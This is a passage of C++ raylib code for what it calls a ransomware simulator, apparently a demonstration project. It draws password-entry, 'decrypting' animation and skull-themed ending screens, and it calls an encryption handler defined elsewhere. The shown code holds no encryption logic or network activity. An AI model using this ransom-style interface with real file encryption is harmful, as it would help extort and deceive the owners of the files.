        DrawText(Line2, textX2, startY + LineSpacing, FontSize, WHITE);
        DrawText(Line3, textX3, startY + 2 * LineSpacing, FontSize, WHITE);
        DrawText(Line4, textX4, startY + 3 * LineSpacing, FontSize, GOLD); // Make the password *pop*

        // DECRYPT Button
        int btnWidth = 200;
        int btnHeight = 50;
        int btnX = (screenWidth - btnWidth) / 2;
        int btnY = startY + 3 * LineSpacing + 100;

        Color BUTTON_COLOR = { 0, 150, 90, 255 };
        Color HOVER_COLOR = { 0, 200, 120, 255 };

        if (DrawCenteredButton("Proceed >>", btnX, btnY, btnWidth, btnHeight, BUTTON_COLOR, HOVER_COLOR)) {
            state = DECRYPT_BEGIN;
            done = true;
        }

        EndDrawing();
    }
}

// PASSWORD TO INITIATE DECRYPTION
void DecryptionBeginning() {
    const int FontSize = 20;
    const int FieldWidth = 300;
    const int FieldHeight = 40;
    
    char Password[64] = "";   // User password input
    int PassIndex = 0;
    
    bool showError = false;
    chrono::time_point<chrono::steady_clock> errorStartTime;  // Time of error occurrence
    string ErrorMessage = "";

    bool done = false;
    while (!done) {
        BeginDrawing();

        // Gradient Background
        for (int y = 0; y < screenHeight; y++) {
            float t = (float)y / screenHeight;
            Color gradColor = {(unsigned char)(0 + t * 15), (unsigned char)(0 + t * 25), (unsigned char)(0 + t * 45), 255};
            DrawRectangle(0, y, screenWidth, 1, gradColor);
        }
        
        // Heading text
        DrawText("Enter Password", screenWidth / 2 - MeasureText("Enter Password", 24) / 2, screenHeight / 2 - 40, 24, WHITE);

        // Password Field
        int centerX = screenWidth / 2 - FieldWidth / 2;
        DrawRectangleLines(centerX, screenHeight / 2 - 10, FieldWidth, FieldHeight, SKYBLUE);
        string masked(PassIndex, '*');
        DrawText(masked.c_str(), centerX + 10, screenHeight / 2, FontSize, WHITE);

        // Input Handling
        int key = GetCharPressed();
        while (key > 0) {
            if (key >= ' ' && key <= '~' && PassIndex < 63) {
                Password[PassIndex++] = (char)key;
                Password[PassIndex] = '\0';
            }
            key = GetCharPressed();
        }

        if (IsKeyPressed(KEY_BACKSPACE) && PassIndex > 0) {
            Password[--PassIndex] = '\0';
        }

        // Decrypt Button
        int btnY = screenHeight / 2 + 50;
    
        Color TEAL = { 108, 122, 137, 255 };
        Color DARKTEAL = { 75, 93, 103, 255 };

        if (DrawCenteredButton("Decrypt", screenWidth / 2 - 100, btnY, 200, 50, DARKTEAL, TEAL)) {
            if (VerifyPassword(Password)) {
                done = true;
                // CALLING FOR DECRYPTION IN CALLING.cpp FILE
                RunEncryptionHandler(2);
                state = DECRYPT_ANIME;
            } else {
                showError = true;
                ErrorMessage = "Error:Incorrect password!";
                errorStartTime = chrono::steady_clock::now();
            }
        }

        // Show Error Message
        if (showError) {
            int textWidth = MeasureText(ErrorMessage.c_str(), 20);
            int textX = (screenWidth - textWidth) / 2;
            DrawText(ErrorMessage.c_str(), textX, btnY + 60, 20, RED);

            // Hide the message after 3 seconds
            auto now = chrono::steady_clock::now();
            if (chrono::duration_cast<chrono::seconds>(now - errorStartTime).count() > 3) {
                showError = false;
            }
        }

        EndDrawing();
    }
}

// ANIMATION OF DECRYPTING
void DecryptingAnimation() {
    bool done = false;

    const float durationBeforeComplete = 10.0f; // Seconds before success message
    float startTime = GetTime();
    bool showCompleteMessage = false;

    const string finalMessage = "ALL YOUR FILES HAVE BEEN SUCCESSFULLY DECRYPTED";
    const int fontSize = 28;
    const float letterStepDelay = 0.15f;  // Slower letter rolling
    float messageStartTime = 0.0f;

    int currentCharIndex = 0;
    vector<char> displayBuffer(finalMessage.size(), ' '); // Start empty

    while (!done) {
        float currentTime = GetTime();
        float elapsed = currentTime - startTime;

        if (!showCompleteMessage && elapsed >= durationBeforeComplete) {
            showCompleteMessage = true;
            messageStartTime = currentTime;
        }

        BeginDrawing();
        ClearBackground(BLACK);

        // --- Matrix Falling Digits ---
        for (auto& d : digits) {
            d.y += d.speed;
            if (d.y > screenHeight) {
                d.y = GetRandomValue(-100, 0);
                d.x = GetRandomValue(0, screenWidth);
                d.speed = GetRandomValue(50, 200) / 60.0f;
                d.value = GetRandomValue(0, 9);
            }
            DrawText(to_string(d.value).c_str(), d.x, static_cast<int>(d.y), 20, GREEN);
        }

        // --- Decrypting message / overlay ---
        int centerY = screenHeight / 2;
        const char* decryptingMsg = "DECRYPTING...";
        int textWidth = MeasureText(decryptingMsg, fontSize);
        int textX = (screenWidth - textWidth) / 2;

        if (!showCompleteMessage) {
            // Background overlay box
            DrawRectangle(textX - 20, centerY - 60, textWidth + 40, fontSize + 100, Fade(BLACK, 0.8f));

            // Main text
            DrawText(decryptingMsg, textX, centerY, fontSize, WHITE);

            // --- Loading boxes animation ---
            float boxSize = 10;
            float boxSpacing = 20;
            float waveSpeed = 6.0f;
            float waveHeight = 10.0f;

            for (int i = 0; i < 4; i++) {
                float offset = sin(currentTime * waveSpeed + i) * waveHeight;
                float boxX = textX + (textWidth / 2) - ((4 * boxSpacing) / 2) + i * boxSpacing;
                float boxY = centerY + 50 + offset;
                DrawRectangle(static_cast<int>(boxX), static_cast<int>(boxY), boxSize, boxSize, GREEN);
            }
        }
        else {
            // Measure full text width of the final message
            int textWidth = MeasureText(finalMessage.c_str(), fontSize);
            int textX = (screenWidth - textWidth) / 2;
            int textY = centerY;

            // Draw black semi-transparent rectangle behind the text
            int overlayPaddingX = 30;
            int overlayPaddingY = 30;

            DrawRectangle(textX - 95, textY - overlayPaddingY, textWidth + 185, fontSize + 2 * overlayPaddingY, Fade(BLACK, 0.8f));

            // --- Rolling Letter Decryption Reveal ---
            if (currentCharIndex < finalMessage.size()) {
                if (currentTime - messageStartTime > currentCharIndex * letterStepDelay) {
                    char targetChar = finalMessage[currentCharIndex];

                    // Reveal instantly if not a letter
                    if (!isalpha(targetChar)) {
                        displayBuffer[currentCharIndex] = targetChar;
                        currentCharIndex++;
                    }
                    else {
                        if (displayBuffer[currentCharIndex] == ' ' || displayBuffer[currentCharIndex] < 'A') {
                            displayBuffer[currentCharIndex] = 'A';
                        } else if (displayBuffer[currentCharIndex] < targetChar) {
                            displayBuffer[currentCharIndex]++;
                        } else {
                            currentCharIndex++;
                        }
                    }
                }
            }

            // Render each character with color logic
            float letterSpacing = fontSize * 0.75f;  // Adjust this to taste (0.75–1.0 usually works well)
            float totalWidth = displayBuffer.size() * letterSpacing;
            int startX = (screenWidth - static_cast<int>(totalWidth)) / 2;
            int y = centerY;

            for (int i = 0; i < displayBuffer.size(); i++) {
                char ch = displayBuffer[i];
                Color color;

                if (i < currentCharIndex) {
                    color = WHITE;
                } else if (i == currentCharIndex) {
                    color = WHITE;
                } else {
                    color = BLACK;
                    ch = ' ';
                }

                DrawText(TextFormat("%c", ch), static_cast<int>(startX + i * letterSpacing), y, fontSize, color);
            }

            // Exit after full message shown
            if (currentCharIndex >= finalMessage.size() && (IsKeyPressed(KEY_ENTER) || IsMouseButtonPressed(MOUSE_LEFT_BUTTON))) {
                state = RANSOMWARE;
                done = true;
            }
        }

        EndDrawing();
    }
}

// ENDING PAGE
void RansomwareSimulator() {
    Texture2D ransomImage = LoadTexture("logo.png");
    Texture2D skullImage = LoadTexture("Skull.png");

    const int screenWidth = GetScreenWidth();
    const int screenHeight = GetScreenHeight();

    // Center the image
    int posX = (screenWidth - ransomImage.width) / 2;
    int posY = (screenHeight - ransomImage.height) / 2;

    float scale = 0.5f;  // scale it to 50%
    Rectangle source = { 0, 0, (float)ransomImage.width, (float)ransomImage.height };
    Rectangle dest = {posX + ransomImage.width * (1 - scale) / 2,  // center properly
        posY + ransomImage.height * (1 - scale) / 2, ransomImage.width * scale, ransomImage.height * scale
    };

    float skullScale = 0.03f;  // Make it about letter-sized; tweak between 0.03 - 0.1
    Rectangle skullSource = { 0, 0, (float)skullImage.width, (float)skullImage.height };

    // Define the safe zone (logo space)
    Rectangle safeZone = {dest.x, dest.y, dest.width, dest.height};

    // Prepare glitch timers
    float glitchStart = 0.0f;
    float glitchDuration = 0.0f;
    bool glitchActive = false;

    int timer = 0;
    bool done = false;

    const Color skullColor = RED;
    const int fontSize = 20;
    const int skullCount = 50;

    // SKULL RAIN ANIMATION
    struct SkullSymbol {
        float x, y, speed;
    };

    vector<SkullSymbol> skull;
    for (int i = 0; i < skullCount; i++) {
        float x;
        // Make sure skull is not inside the safeZone horizontally
        while (true) {
            x = static_cast<float>(GetRandomValue(0, screenWidth));
            if (x < safeZone.x || x > (safeZone.x + safeZone.width)) break;
        }
        skull.push_back({ x, static_cast<float>(GetRandomValue(0, screenHeight)), GetRandomValue(20, 100) / 60.0f});
    }

    while (!done) {
        // Close Window Condition
        if (WindowShouldClose()) {
            UnloadTexture(ransomImage);
            UnloadTexture(skullImage);
            CloseWindow();
            exit(0);
        }

        float timeNow = GetTime();

        // Randomly trigger a glitch
        if (!glitchActive && (rand() % 180) == 0) {
            glitchActive = true;
            glitchStart = timeNow;
            glitchDuration = 0.1f + (float)(rand() % 10) / 80.0f; // 0.1 to 0.6 sec
        }

        // End glitch after duration
        if (glitchActive && (timeNow - glitchStart) > glitchDuration) {
            glitchActive = false;
        }

        BeginDrawing();
        ClearBackground(BLACK);

        // --- Glitching logo ---
        if (!glitchActive) {
            DrawTexturePro(ransomImage, source, dest, { 0, 0 }, 0.0f, WHITE);

        } else {
            for (int i = 0; i < 10; i++) {
                int lineY = rand() % ransomImage.height;
                int height = 2 + rand() % 3;
                int shift = -10 + rand() % 21;

                Rectangle srcRec = { 0.0f, (float)lineY, (float)ransomImage.width, (float)height };
                Rectangle destRec = { (float)(posX + shift), (float)(posY + lineY), (float)ransomImage.width, (float)height };
                DrawTextureRec(ransomImage, srcRec, (Vector2){ destRec.x, destRec.y }, WHITE);
            }
        }

        // --- Matrix Skull Rain (left + right side only) ---
        for (auto& d : skull) {
            d.y += d.speed;
            Rectangle skullDest = {d.x, d.y, skullImage.width * skullScale, skullImage.height * skullScale};
            if (d.y > screenHeight) {
                d.y = -fontSize;
                // Choose new x outside of safeZone
                while (true) {
                    d.x = GetRandomValue(0, screenWidth);
                    if (d.x < safeZone.x || d.x > (safeZone.x + safeZone.width)) break;
                }
                d.speed = GetRandomValue(20, 100) / 60.0f;
            }
            DrawTexturePro(skullImage, skullSource, skullDest, { 0, 0 }, 0.0f, RED);
        }
        EndDrawing();
    }
    UnloadTexture(ransomImage);
    UnloadTexture(skullImage);
    state = MAIN_MENU;
}
